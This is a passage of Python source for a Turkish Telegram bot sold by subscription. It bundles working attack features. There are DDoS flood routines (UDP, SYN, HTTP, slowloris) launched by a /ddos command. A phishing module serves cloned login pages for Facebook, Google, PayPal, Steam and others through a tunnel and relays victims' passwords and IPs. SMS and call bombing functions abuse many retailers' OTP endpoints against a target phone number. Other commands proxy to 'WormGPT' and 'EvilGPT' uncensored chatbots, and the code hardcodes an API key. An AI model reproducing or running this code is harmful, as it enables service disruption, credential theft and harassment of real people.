        Thread(target=saldiri_baslat, args=(message, target, port, duration)).start()
    except IndexError:
        bot.reply_to(message, "Burada Sitelere Sert DDOS'lar Atabilirsin. \nÖrnek Kullanım;\n /ddos google.com 20\n\nMesela Yukardaki Komut Google'ye 20 Saniyelik DDOS (Saldırı) Yapar")
    except ValueError:
        bot.reply_to(message, "Yanlış Komut Kullandın!")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {e}")    
        
error_file = "logs/error.log"
cf_file = "logs/lh.log"
cf_log = open(cf_file, 'w')


def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""


def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text) + "\n")
        

def grep(regex, target):
    if isfile(target):
        with open(target, "r") as file:
            content = file.read()
            matches = re.findall(regex, content)
            if matches:
                return matches[0]  # İlk eşleşmeyi döndür.
    return ""


def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)


kullanici_verisi = {}

def setup(site, chat_id):
    bot.send_message(chat_id, 'Şimdi Sana Bir Link Vericem, Bu Linki Kurbanına At Ve Ona Şifreyi Girmesini İste Böylece Onun Linke Girdiği Şifreyi Sana Vericem Ve Hesabına Erişebileceksin. Buna Phishing Denir.\nBir Sorun Olursa; @Tekn0Droid Bana Yaz ;)') 
    os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
    time.sleep(2)
    bot.send_message(chat_id, 'Linkin Oluşturuluyor...')
    time.sleep(2)
    bgtask("ssh -R 80:localhost:8080 localhost.run -T -n", stdout=cf_log, stderr=cf_log)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]*.lhr.life)", cf_file)
        if cf_url!= "":
            cf_success = True
            break
        time.sleep(1)
    bot.send_message(chat_id, f'\n[~] Link: {cf_url}')
    bot.send_message(chat_id, '\nLinki Kurbana Tıklat, Linkten Haber Bekliyorum Biri Gridiğinde Sana Bilgilerini Atıcam...')
    while True:
        if os.path.isfile(f'pages/{site}/usuarios.txt'):
            bot.send_message(chat_id, '\nLinke Birileri Girdi!')
            user_data = cat(f'pages/{site}/usuarios.txt')
            kullanici_verisi[chat_id] = user_data
            bot.send_message(chat_id, user_data)
            os.system(f"cat pages/{site}/usuarios.txt >> pages/{site}/usuarios_guardados.txt")
            os.system(f"rm -rf pages/{site}/usuarios.txt")
        if os.path.isfile(f'pages/{site}/ip.txt'):
            bot.send_message(chat_id, '\nIP ADRESİ BULUNDU!')
            ip_data = cat(f'pages/{site}/ip.txt')
            bot.send_message(chat_id, ip_data)
            os.system(f"cat pages/{site}/ip.txt >> pages/{site}/ip_guardados.txt")
            os.system(f"rm -rf pages/{site}/ip.txt")    
@bot.message_handler(commands=['phisher'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def phisher_menu(message):
    markup = types.InlineKeyboardMarkup()
    # Inline butonları oluştur
    button_list = [
        types.InlineKeyboardButton("Facebook", callback_data='Facebook'),
        types.InlineKeyboardButton("Google", callback_data='Google'),
        types.InlineKeyboardButton("Twitter", callback_data='Twitter'),
        types.InlineKeyboardButton("Netflix", callback_data='Netflix'),
        types.InlineKeyboardButton("Github", callback_data='Github'),
        types.InlineKeyboardButton("Discord", callback_data='Discord'),
        types.InlineKeyboardButton("Paypal", callback_data='Paypal'),
        types.InlineKeyboardButton("Roblox", callback_data='Roblox'),
        types.InlineKeyboardButton("Steam", callback_data='Steam'),
        types.InlineKeyboardButton("Instagram", callback_data='Instagram'),
    ]
    # Butonları ikişerli gruplar halinde ekle
    while button_list:
        markup.row(*button_list[:2])
        button_list = button_list[2:]
    bot.send_message(message.chat.id, "Phisher İşlemi İçin Hangisini Kullanmak İstersin:", reply_markup=markup)

# İnline butonların callback data'sını işleyecek fonksiyon
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    site_map = {
        'Facebook': "Facebook",
        'Google': "Google",
        'Twitter': "Twitter",
        'Netflix': "Netflix",
        'Github': "Github",
        'Discord': "Discord",
        'Paypal': "Paypal",
        'Roblox': "Roblox",
        'Steam': "Steam",
        'Instagram': "Instagram"
    }
    choice = call.data
    site = site_map.get(choice)
    if site:
        setup(site, call.message.chat.id)
    else:
        bot.send_message(call.message.chat.id, 'Hatalı Seçim!')
    bot.answer_callback_query(call.id)  # Callback query'i yanıtla                                                
        
@bot.message_handler(commands=['ticaret_egitimi'])
@safe_execute
@check_membership
 
@user_is_logged_in
@user_is_premium
def gelir_kaynaklari_mesaj(message):
    klavye = [
        [types.InlineKeyboardButton("Andrew Tate Türkçe Eğitim Seti", url="https://drive.google.com/drive/folders/1Vu9PrsXw8-GmtFcNhZ-JMWicm2KotvIr")],
        [types.InlineKeyboardButton("2000 Video Arka Plan", url="https://drive.google.com/drive/mobile/folders/1X_evEg_ww2hbGgmudaUg8nIdaRXLzuU0")],
        [types.InlineKeyboardButton("Instagram Büyütme Teknikleri", url="https://sg.docworkspace.com/d/sIOLsnszwAYifm60G")],
        [types.InlineKeyboardButton("Zengin Baba Yoksul Baba Kitabı", url="https://drive.google.com/file/d/1eAVYXoTuFakh6w8yDWs6gnE9RHr4HSMn/view?usp=drivesdk")],
        [types.InlineKeyboardButton("Iman Gadhzi Kursu", url="https://drive.google.com/drive/folders/1-VPclkvdaSU_mVdt1WIsIJAEVwXdBaSa")],
        [types.InlineKeyboardButton("The Real World İngilizce", url="https://drive.google.com/drive/folders/1qA6pjwthS8x71pVce94JLUG7Cwt0JGfh")],
        [types.InlineKeyboardButton("İkonik Görseller", url="https://drive.google.com/drive/folders/14iEgMBpZmHKijXJC-vhGH_lUYhANT4tm")],
        [types.InlineKeyboardButton("Can't Hurt Me Kitabı", url="https://drive.google.com/file/d/1UHRZNU-aljUjZ9W-i08GCHy1WXZQJTJY/view?usp=drivesdk")],
        [types.InlineKeyboardButton("Türkçe The Real World Eğitim Seti", url="https://drive.google.com/drive/folders/1-WW1S1eiLvTug4mzgzf1zhLD1tTOmfdH")],
        [types.InlineKeyboardButton("Yaratıcı Arka Planlar", url="https://drive.google.com/drive/folders/1uOw4Uc7qmxbS-byHbPHp06Lag5U28K9C")],
        [types.InlineKeyboardButton("Başarıya Giden Yol", url="https://drive.google.com/file/d/1nrRYormy0j-8TfjBYcsH2ayBB1p4QUKJ/view?usp=drivesdk")],
        [types.InlineKeyboardButton("Tate Temalı Arka Planlar", url="https://drive.google.com/drive/folders/10YovPTD_HYCWOpv8hLlek4nno1qK7cTP")],
        [types.InlineKeyboardButton("Iman Gadzhi SMMA Kursu", url="https://drive.google.com/drive/folders/1aGFHTOesrkoZg1FjY2LSysazdU8c5yVi?usp=sharing")],
        [types.InlineKeyboardButton("Metin-Ses Dönüştürücü", url="https://elevenlabs.io/text-to-speech")],
        [types.InlineKeyboardButton("Oyun Videoları", url="https://drive.google.com/drive/mobile/folders/1zwhmbfgPIR6IlvGcqHKvZTmL5MQOQcBN?fbclid=IwAR1nyAhTSvf6BwH_GM8iQgZQ-whBUgENUUSy5IQwLcuyi-FPkLStk4hVi0U")],
        [types.InlineKeyboardButton("Dikkat Dağıtıcı Videolar", url="https://drive.google.com/drive/folders/1bD6YPK_8VdAb8r2-74hWGutTUjdO0_Xm")],
        [types.InlineKeyboardButton("Genel Arka Plan Videoları", url="https://drive.google.com/drive/folders/1-0dBza8VpK8mpBcc-YEWe-J0e9gV96tc")]
    ]

    reply_markup = types.InlineKeyboardMarkup(klavye)
    bot.send_message(message.chat.id, 'İşte Senin İçin Birkaç Gelir Kaynağı:', reply_markup=reply_markup)
            
        
@bot.message_handler(commands=['postview'])
@safe_execute
@check_membership
 
@user_is_logged_in
@user_is_premium
def handle_message(message):
    user_id = str(message.from_user.id)  # user_id'yi string olarak alıyoruz

    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "Bu komut ile Telegram mesajının görüntüleme sayısını son hızda arttırabilirsin.\nÖrnek kullanım;\n/postview https://t.me/TeknoDroidEvreni/1")
            return

        _, url = parts

        path = url.replace('https://t.me/', '')
        parts = path.split('/')
        if len(parts) == 2 and parts[1].isdigit():
            # Kanal adı ve post numarasını global değişkenlere ata
            global channel, post
            channel, post = parts
            # Görünürlük artırma işlemini başlat
            Thread(target=start_view).start()
            bot.reply_to(message, "Mesajının görüntüleme sayısı son hızda arttırılıyor ;)")
        else:
            raise ValueError("URL formatı uygun değil. Lütfen 'https://t.me/channelname/postnumber' formatını kullanın.")
    except ValueError as e:
        bot.reply_to(message, f"Hata: {e}")
    except Exception as e:
        bot.reply_to(message, f"Beklenmeyen bir hata oluştu: {e}")        
        
@bot.message_handler(commands=['aramabomb'])
@safe_execute
@check_membership
 
@user_is_logged_in
@user_is_premium
def send_unknown_calls(message):
    chat_id = message.chat.id
    args = message.text.split()[1:]

    if len(args) == 0:
        bot.reply_to(message, "Arama Bombası Göndermen İçin Önce /aramabomb Komutunu Yaz Ardından Göndereceğin Numarayı Ülke Koduyla Gir.\nÖrnek Kullanım;\n/aramabomb +905555555555\n\nNOT;\nBu Kod Seçtiğiniz Numaraya Sadece Bir Arama Gönderir Eğer Daha Fazla Göndermesini İsterseniz Aynı Komutu Aynı Numaraya Üst Üste Girin.")
        return

    phone_number = args[0]
    send_spam(phone_number, chat_id)    
    
import threading
import queue

komut_kuyrugu = queue.Queue()

def smsbomb_isleyici_wrapper(mesaj):
    komut_kuyrugu.put(mesaj)
    if threading.active_count() == 1:  # Sadece ana thread çalışıyorsa
        while not komut_kuyrugu.empty():
            guncel_mesaj = komut_kuyrugu.get()
            try:
                threading.Thread(target=smsbomb_isleyici, args=(guncel_mesaj,)).start()
            finally:
                komut_kuyrugu.task_done()

# smsbomb_isleyici fonksiyonunuza dokunmayın, yukarıdaki wrapper fonksiyonunu kullanarak asıl işlevi çağırın.            
        
@bot.message_handler(commands=['smsbomb'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def smsbomb_isleyici(mesaj):
    try:
        argumanlar = mesaj.text.split()
        if len(argumanlar) != 3:
            bot.reply_to(mesaj, "Bu Komut İle İstediğin Kişiye İstediğin Sayıda SMS Bombası Gönderebilirsin.\nÖrnek Kullanım;\n/smsbomb 5555555555 15\n\nBu Komut Hedef Numaraya 15 SMS Gönderir Sen Kendi Sayını Girebilirsin Ancak Numaranın Başına +90 Veya 0 Ekleme")
            return
        
        tel_no = argumanlar[1]
        orijinal_mesaj_sayisi = int(argumanlar[2])
        mesaj_sayisi = orijinal_mesaj_sayisi * 5  # Kullanıcıdan alınan değerin 5 katına çıkarılması
        if len(tel_no) == 10 and tel_no[0] == '5' and orijinal_mesaj_sayisi > 0:
            gonderim_baslat(tel_no, mesaj_sayisi, 500, mesaj, orijinal_mesaj_sayisi)
        else:
            bot.reply_to(mesaj, "Hatalı Numara Veya SMS Sayısı.")
    except Exception as e:
        bot.reply_to(mesaj, f"Bir Hata Oluştu: {e}")
        
@bot.message_handler(commands=['goruntu_olustur_ai'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def image_generate(message):
    # Kullanıcının gönderdiği metni ayıklama
    try:
        _, query = message.text.split(' ', 1)
    except ValueError:
        # Kullanıcı yeterli bilgi sağlamazsa hata mesajı gönder
        bot.reply_to(message, "Lütfen komutla birlikte bir anahtar kelime giriniz. Örneğin: /goruntu_olustur_ai kedi")
        return

    # Gelen metni İngilizce'ye çevirme
    translated_text = translate_to_english(query)

    if translated_text is None:
        bot.reply_to(message, "Metin çevirisi yapılamadı, lütfen tekrar deneyin.")
        return

    # Unsplash üzerinden görüntü URL'si oluşturma
    url = f'https://source.unsplash.com/featured/?{translated_text}'

    # Görüntüyü indirme ve Telegram üzerinden gönderme
    response = requests.get(url)
    if response.status_code == 200:
        # BytesIO ile indirilen görüntüyü Telegram'a yüklemek için bir dosya gibi kullan
        img = BytesIO(response.content)
        img.name = 'image.jpg'
        bot.send_photo(message.chat.id, photo=img)
    else:
        bot.reply_to(message, "Görüntü yüklenirken bir hata oluştu, lütfen daha sonra tekrar deneyin.")

def translate_to_english(input_text):
    """Verilen metni İngilizce'ye çevirir."""
    try:
        response = requests.get(f'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=en&dt=t&ie=UTF-8&oe=UTF-8&q={input_text}')
        # Çeviri sonucunu JSON'dan alıp döndür
        translated_text = response.json()[0][0][0]
        return translated_text
    except Exception:
        # Çeviri sırasında bir hata meydana geldiğinde,
        # hata mesajını yazdırmak yerine None döndürerek sessiz bir şekilde hata işleme
        return None
        
@bot.message_handler(commands=['wormgpt'])
@safe_execute
@check_membership
 
@user_is_logged_in
@user_is_premium
def handle_wormgpt(message):
    user_message = ' '.join(message.text.split()[1:])  # Kullanıcı mesajını al
    if user_message:
        # WormGPT API'ye istek yapmak için gerekenler
        headers = {
            'x-wormgpt-provider': 'worm_gpt',
            'Content-Type': 'application/json',
        }
        json_data = {
            'messages': [
                {
                    'role': 'user',
                    'content': user_message,
                },
            ],
            'max_tokens': 820,
        }
        try:
            response = requests.post('https://wrmgpt.com/v1/chat/completions', headers=headers, json=json_data)
            response.raise_for_status()  # HTTP hata kodlarına karşı kontrol
            bot_response = response.json()['choices'][0]['message']['content']
            # API'den gelen yanıtı Türkçeye çevir
            translated_response = translate_message(bot_response, "tr")
        except Exception as e:
            translated_response = f"Bir hata oluştu: {e}"
    else:
        translated_response = "Lütfen bir mesaj girin. Örneğin: /wormgpt Merhaba, Bugun Nasılsın Bakalım?"

    bot.reply_to(message, translated_response)        
    
@bot.message_handler(commands=['evilgpt'])
@safe_execute
@check_membership
 
@user_is_logged_in
@user_is_premium
def send_evilgpt_response(message):
    user_input = message.text.split(' ', 1)[1] if len(message.text.split(' ')) > 1 else ""

    if user_input:
        # EvilGPT API'ye istek yap
        evilgpt_url = "https://dev-gpts.pantheonsite.io/wp-admin/js/apis/Se7en_Eyes/EvilGPT.php"
        params = {'text': user_input}
        evilgpt_response = requests.get(evilgpt_url, params=params).text

        # Yanıtı Türkçeye çevir
        translated_text = translate_message(evilgpt_response)

        # Çevrilen yanıtı kullanıcıya gönder
        bot.reply_to(message, translated_text)
    else:
        bot.reply_to(message, "Lütfen bir mesaj ekleyin. Örnek kullanım: /evilgpt selam")
        
        
        
def translate_message(text, target_language='tr'):
    base_url = "https://translate.googleapis.com/translate_a/single"
    params = {
        "client": "gtx",
        "sl": "auto",
        "tl": target_language,
        "dt": "t",
        "ie": "UTF-8",
        "oe": "UTF-8",
        "q": text
    }
    response = requests.get(base_url, params=params)
    if response.status_code == 200:
        translated_text = response.json()[0][0][0]
        return translated_text
    else:
        return "Çeviri yapılırken bir hata oluştu."              
@bot.message_handler(commands=['key_al'])
def send_key_message(message):
    key_message = """
🚀 BOT KEY SATIŞLARIMIZ ERKENDEN BAŞLADI! 🚀  

💡 Fırsat Paketleri:  
🔑 1 Aylık Key: 10 TL  
🔑 3 Aylık Key: 25 TL  
🔑 1 Yıllık Key: 100 TL  


Kampanyalar; 

- 🎁 1 Aylık Key Alanlara Bedava Telegram DM Banı Kaldırma Yöntemi  

- 🎁 3 Aylık Key Alanlara Garantili Fake No (50 TL'den 30 TL'ye)  

- 🎁 Yıllık Key Alanlara:  
  - Hack Eğitim Seti (200 TL'den 150 TL'ye)  
  - Özel Kanala Alım (50 TL'den 30 TL'ye)  
  - SMM Panel Kurulumu (200 TL'den 100 TL'ye) 

BOTUMUZ;  
t.me/CVARB_AI_bot
    """
    bot.send_message(message.chat.id, key_message)  
    
def udp_flood(target_ip, target_port, duration, packets_sent_list):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            bytes = random._urandom(1024)
            udp_socket.sendto(bytes, (target_ip, target_port))
            packets_sent += 1
    except Exception:
        pass
    finally:
        packets_sent_list.append(packets_sent)
        udp_socket.close()

def syn_flood(target_ip, target_port, duration, packets_sent_list):
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            sock.sendto(b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
            sock.close()
            packets_sent += 1
    except Exception:
        pass
    finally:
        packets_sent_list.append(packets_sent)

def http_flood(target_ip, target_port, duration, packets_sent_list):
    headers = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(headers.encode())
            sock.close()
            packets_sent += 1
    except Exception:
        pass
    finally:
        packets_sent_list.append(packets_sent)

def slowloris(target_ip, target_port, duration, packets_sent_list):
    headers = (
        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Connection: keep-alive\r\n"
    )
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(headers.encode())
            time.sleep(15)  # Bu satır, bağlantıyı açık tutmak için bekleme süresini simüle eder.
            packets_sent += 1
    except Exception:
        pass
    finally:
        packets_sent_list.append(packets_sent)
        
def site_ip_bul(site):
    try:
        return socket.gethostbyname(site)
    except Exception:
        # Hata oluştuğunda, herhangi bir hata mesajı yazdırmadan None döndür
        return None

def saldiri_baslat(message, site, port, sure):
    ip_adresi = site_ip_bul(site)
    if ip_adresi:
        packets_sent_list = []
        

        # Saldırı thread'lerini başlat
        Thread(target=udp_flood, args=(ip_adresi, port, sure, packets_sent_list)).start()
        # Diğer saldırı türleri için benzer Thread satırları ekleyebilirsiniz

        # Kullanıcıya bilgi mesajı gönder
        bot.reply_to(message, f"{site} adresine {sure} Saniyelik DDOS Saldırısı Başladı ⚡")
    else:
        bot.reply_to(message, "Hedef Siteye Ulaşılamıyor, Geçerli Bir Site Gir!")


        
kullanici_verisi = {}


    
@bot.message_handler(commands=['ilk_yazan'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def baslat_komutu(mesaj):
    msg = bot.send_message(mesaj.chat.id, "Lütfen API ID'nizi girin:")
    bot.register_next_step_handler(msg, api_id_isle, mesaj.chat.id)

# API ID işleme
def api_id_isle(mesaj, chat_id):
    api_id = mesaj.text
    kullanici_verisi[chat_id] = {'api_id': api_id}
    msg = bot.send_message(chat_id, "Lütfen API Hash'inizi girin:")
    bot.register_next_step_handler(msg, api_hash_isle, chat_id)

# API Hash işleme
def api_hash_isle(mesaj, chat_id):
    api_hash = mesaj.text
    kullanici_verisi[chat_id]['api_hash'] = api_hash
    # Gerekirse burada iki adımlı doğrulama mantığı eklenebilir
    msg = bot.send_message(chat_id, "Bot ilk yazdığında ne yanıt versin?\n(Örneğin; Bu Mesaja İlk Yorumu Ben Yaptım 😎) Gibi")
    bot.register_next_step_handler(msg, ozel_mesaj_isle, chat_id)

# Özel Mesaj işleme
def ozel_mesaj_isle(mesaj, chat_id):
    ozel_mesaj = mesaj.text
    kullanici_verisi[chat_id]['ozel_mesaj'] = ozel_mesaj
    bot.send_message(chat_id, "Güzel, Artık Tüm Kanallarda Her Zaman İlk Yazan Sen Olacaksın ;)")        
    
# Pexels API anahtarınızı buraya girin
pexels_api_key = '13UzVodepETZ99a9uz4kUgsTypomsdjNoKOwp8bflisWbgUlWdns9ib0'

# 1 ile 1000 arasındaki tüm ID'leri içeren bir liste oluştur.
available_ids = list(range(1, 1000))

def get_random_picsum_wallpaper():
    global available_ids
    if not available_ids:
        available_ids = list(range(1, 1000))
    selected_id = random.choice(available_ids)
    available_ids.remove(selected_id)
    return f'https://picsum.photos/id/{selected_id}/1200/800'

def get_random_pexels_wallpaper():
    headers = {'Authorization': pexels_api_key}
    response = requests.get('https://api.pexels.com/v1/search?query=wallpaper&per_page=15', headers=headers)
    wallpapers = response.json()['photos']
    random_wallpaper = random.choice(wallpapers)['src']['original']
    return random_wallpaper

def send_wallpaper(message, count=1):
    for _ in range(count):
        # Picsum ve Pexels arasında seçim yapma (Picsum daha sık seçilecek)
        if random.randint(1, 10) > 2:  # %80 olasılıkla Picsum, %20 olasılıkla Pexels
            wallpaper_url = get_random_picsum_wallpaper()
        else:
            wallpaper_url = get_random_pexels_wallpaper()

        bot.send_photo(message.chat.id, wallpaper_url)

@bot.message_handler(commands=['duvar_kagidi'])
@safe_execute
@check_membership
@user_is_logged_in
def handle_wallpaper_command(message):
    parts = message.text.split()
    if len(parts) == 2 and parts[1].isdigit():
        count = int(parts[1])
        send_wallpaper(message, min(count, 5000))  # Kullanıcıdan en fazla 5000 duvar kağıdı istenebilir.
    elif len(parts) == 1:
        bot.reply_to(message, "Komutun Yanına Kaç Resim İstediğini Yaz.\nÖrneğin;\n\n/duvar_kagidi 3\n Bu Komut 3 Duvar Kağıdı Atar.")
    else:
        send_wallpaper(message, 1)
        
secenekler = {1: {'Canada': '+13434535118'},
    2: {'United States': '+13182697169'},
    3: {'Netherlands': '+3197010518302'},
    4: {'France': '+33644629866'},
    5: {'Sweden': '+46726412705'},
    6: {'Sweden': '+46726412713'},
    7: {'Sweden': '+46726412760'},
    8: {'China': '+8615486934106'},
    9: {'United Kingdom': '+447700184823'},
    10: {'France': '+33644628322'},
    11: {'United States': '+15024653767'},
    12: {'France': '+33757056592'},
    13: {'France': '+33757056461'},
    14: {'China': '+8613748154841'},
    15: {'United Kingdom': '+447893984121'},
    16: {'United Kingdom': '+447893984120'},
    17: {'United Kingdom': '+447893984119'},
    18: {'United Kingdom': '+447893984118'},
    19: {'France': '+33644628325'},
    20: {'France': '+33644628324'},
    21: {'China': '+8613666696969'},
    22: {'United Kingdom': '+447776728014'},
    23: {'Russia': '+79991966144'},
    24: {'Hong Kong': '+852256495852652'},
    25: {'China': '+861824087849754'},
    26: {'United States': '+1219923540657'},
    27: {'United States': '+125883832111'},
    28: {'Hong Kong': '+852725310451'},
    29: {'Hong Kong': '+852302792408'},
    30: {'China': '+861823675884622'},
    31: {'Hong Kong': '+8527876214827'},
    32: {'China': '+861397947212331'},
    33: {'Hong Kong': '+8521482538124633'},
    34: {'Hong Kong': '+8521371381152740'},
    35: {'Hong Kong': '+852256495852647'},
    36: {'China': '+861824087849749'},
    37: {'United States': '+1219923540652'},
    38: {'United States': '+1258838321156'},
    39: {'Hong Kong': '+8527253104558'},
    40: {'Hong Kong': '+852302792403'},
    41: {'China': '+861823675884617'},
    42: {'Hong Kong': '+8527876214822'},
    43: {'China': '+861397947212326'},
    44: {'Hong Kong': '+8521482538124628'},
    45: {'Hong Kong': '+8521371381152735'},
    46: {'Hong Kong': '+852256495852642'},
    47: {'China': '+861824087849744'},
    48: {'United States': '+1219923540647'},
    49: {'United States': '+1258838321151'},
    50: {'Hong Kong': '+8527253104553'},
    51: {'Hong Kong': '+85222912297791'},
    52: {'China': '+86182367588467'},
    53: {'Hong Kong': '+8527876214812'},
    54: {'China': '+861397947212316'},
    55: {'Hong Kong': '+8521482538124618'},
    56: {'Hong Kong': '+8521371381152725'},
    57: {'Hong Kong': '+852256495852632'},
    58: {'China': '+861824087849734'},
    59: {'United States': '+1219923540637'},
    60: {'United States': '+1258838321141'},
    61: {'Hong Kong': '+8527253104543'},
    62: {'Hong Kong': '+852229122977953'},
    63: {'China': '+86182367588462'},
    64: {'Hong Kong': '+852787621487'},
    65: {'Hong Kong': '+8521482538124613'},
    66: {'Hong Kong': '+8521371381152720'},
    67: {'Hong Kong': '+852256495852627'},
    68: {'China': '+861824087849729'},
    69: {'United States': '+1219923540632'},
    70: {'United States': '+1258838321136'},
    71: {'Hong Kong': '+8527253104538'},
    72: {'Hong Kong': '+852229122977948'},
    73: {'Hong Kong': '+852151692081501'},
    74: {'Hong Kong': '+852144678972531'},
    75: {'China': '+8613578845916'},
    76: {'United States': '+15053753974'},
    77: {'United States': '+12083064581'},
    78: {'Hong Kong': '+852145830144792'},
    79: {'United States': '+12926554282'},
    80: {'China': '+8615470874900'},
    81: {'United Kingdom': '+447388549972'},
    82: {'United States': '+12942129232'},
    83: {'United States': '+12448719084'},
    84: {'China': '+8613852699482'},
    85: {'United States': '+12126803691'},
    86: {'China': '+8613556847047'},
    87: {'Netherlands': '+31657479598'},
    88: {'United Kingdom': '+447404300533'},
    89: {'Latvia': '+37126031755'},
    90: {'Hong Kong': '+85218145671497'}}  # Yukarıdaki secenekler sözlüğünüzü buraya koyun.

def fetch_messages(num):
    url = f'https://sms24.me/en/numbers/{num}'
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    mesajlar = [span.text.strip() for span in soup.find_all('span', class_='placeholder text-break')]
    return "\n".join(mesajlar) if mesajlar else "Bu Numaraya Henüz Mesaj Gelmemiş."


@bot.callback_query_handler(func=lambda call: True)
def interstellar_dispatch(call):
    num = int(call.data)
    if num in secenekler:
        ulke = list(secenekler[num].keys())[0]
        numara = secenekler[num][ulke].split('+')[1]
        mesajlar = fetch_messages(numara)
        bot.send_message(call.message.chat.id, f"Seçilen numara: {secenekler[num][ulke]}\n\nGelen Mesajlar:\n{mesajlar}\n\nBY: CVARB BOT 🤖")
    else:
        bot.answer_callback_query(call.id, "Geçersiz Seçim.")
        
toplam_gonderimler = 0
basarili_gonderimler = 0
basarisiz_gonderimler = 0
        
def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto"
        else:
            return False, "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin"
        else:
            return False, "İsteGelsin"
    except:
        return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]

        if r1 == True:
            return True, "İkinci Yeni"
        else:
            return False, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]

        if r1 == True:
            return True, "Migros"
        else:
            return False, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number": f"{number}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Cepte Şok"
        else:
            return False, "Cepte Şok"
    except:
        return False, "Cepte Şok"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": f"{uuid.uuid4()}",
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BiSU"
        else:
            return False, "BiSU"
    except:
        return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
